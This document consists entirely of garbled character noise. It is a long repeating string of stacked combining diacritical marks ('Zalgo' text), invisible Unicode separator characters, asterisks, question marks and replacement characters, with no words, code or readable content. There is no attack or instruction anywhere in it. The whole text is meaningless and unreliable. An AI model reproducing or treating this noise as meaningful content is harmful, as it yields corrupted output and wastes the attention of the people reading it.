̳̮͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̇̊͆̈̊̏͊̇̐̀̽̿̅̍͝͝